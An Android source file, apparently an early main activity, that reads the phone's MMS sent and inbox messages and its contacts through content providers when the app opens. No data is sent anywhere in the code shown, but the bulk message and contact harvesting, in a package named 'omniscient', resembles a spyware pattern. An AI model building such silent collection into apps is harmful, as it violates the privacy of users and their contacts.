package com.postal.omniscient;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import com.postal.omniscient.postal.contact.reader.ReadContacts;
import com.postal.omniscient.postal.contact.reader.ReadSms;


public class MainActivity extends AppCompatActivity {
    private static String Msg = "MyMsg1";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
//        getContacts();//in test
        ReadSms ob = new ReadSms(getContentResolver());

        String uri_send_sms = "content://sms/sent";
        String uri_inbox_sms = "content://sms/inbox";

        String uri_send_mms = "content://mms/sent";
        String uri_inbox_mms = "content://mms/inbox";
//        ob.massAllSMS(uri_send_sms, uri_inbox_sms);
        ob.massAllSMS(uri_send_mms, uri_inbox_mms);

    }
    private void getContacts(){
        ReadContacts getPhones = new ReadContacts(getContentResolver());
        String [][] phone_contacts = getPhones.readContacts();

            for (int i=0; getPhones.getX()>i; i++) {
                if(phone_contacts[i][0]!=null) {
//                    Log.i(Msg, " ОТВЕТ размер1 - " + phone_contacts[i][0]);

                }

                for (int k=1; getPhones.getY()>k; k++) {
                    if (phone_contacts[i][k] != null) {
//                        Log.i(Msg, " ОТВЕТ размер2  - " + phone_contacts[i][k]);
                    }
                }

                }
            }

}
